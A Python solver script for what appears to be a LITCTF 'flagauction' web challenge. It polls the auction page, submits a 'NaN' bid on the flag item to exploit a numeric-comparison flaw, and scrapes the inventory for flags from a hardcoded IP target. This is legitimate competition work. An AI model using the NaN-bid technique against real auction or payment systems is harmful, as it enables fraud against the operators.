import sys
import time
import re

try:
    import requests
except ImportError as exc:
    print("This script requires the 'requests' package. Install with: pip install requests")
    raise


def extract_flags(html: str) -> list[str]:
    """Best-effort extraction of flag-looking tokens from HTML."""
    # LITCTF flag pattern: LITCTF{...}
    pattern = re.compile(r"LITCTF\{[^}]+\}")
    return pattern.findall(html)


def has_text(html: str, needle: str) -> bool:
    return needle in html


def solve(base_url: str, poll_interval_sec: float = 1.0, wait_after_bid_sec: int = 0) -> None:
    if base_url.endswith('/'):
        base_url = base_url[:-1]

    session = requests.Session()
    session.headers.update({
        "User-Agent": "flagauction-solver/1.0"
    })

    def get(path: str) -> requests.Response:
        return session.get(f"{base_url}{path}", allow_redirects=True, timeout=10)

    def post(path: str, data: dict) -> requests.Response:
        return session.post(f"{base_url}{path}", data=data, allow_redirects=True, timeout=10)

    def register() -> None:
        get("/register")

    # Ensure we have a session
    register()

    # Wait for an ongoing auction, (re-)registering if we get bounced
    print(f"[*] Target: {base_url}")
    print("[*] Waiting for auction to be ongoing…")
    while True:
        try:
            r = get("/")
            html = r.text
        except Exception as e:
            print(f"[!] Error fetching status: {e}")
            time.sleep(poll_interval_sec)
            continue

        if has_text(html, "The auction is ongoing."):
            break

        # If we got redirected or the session reset, re-register
        if has_text(html, "<title>Sucess</title>") or has_text(html, "Username:"):
            register()
            print("[*] Re-registered session.")

        time.sleep(poll_interval_sec)

    # Place NaN bid on flag item (item_id=2)
    print("[*] Auction is ongoing — placing NaN bid on flag (item_id=2)…")
    try:
        post("/bid", {"item_id": "2", "bid": "NaN"})
        print("[+] NaN bid submitted.")
    except Exception as e:
        print(f"[!] Error submitting bid: {e}")
        return

    if wait_after_bid_sec > 0:
        time.sleep(wait_after_bid_sec)

    # Wait for auction to end
    print("[*] Waiting for auction to end…")
    while True:
        try:
            r = get("/")
            html = r.text
        except Exception as e:
            print(f"[!] Error fetching status: {e}")
            time.sleep(poll_interval_sec)
            continue

        if has_text(html, "The auction has ended."):
            break
        time.sleep(poll_interval_sec)

    # Fetch inventory
    print("[*] Fetching inventory…")
    try:
        inv = get("/inventory").text
    except Exception as e:
        print(f"[!] Error fetching inventory: {e}")
        return

    flags = extract_flags(inv)
    if flags:
        print("[+] Possible flags found:")
        for f in flags:
            print(f"    {f}")
    else:
        print("[!] No obvious flag pattern found. Raw inventory HTML follows:\n")
        print(inv)


if __name__ == "__main__":
    # Default target from prior context; can override via argv[1]
    target = "http://34.44.129.8:59580"
    if len(sys.argv) >= 2:
        target = sys.argv[1]
    solve(target)
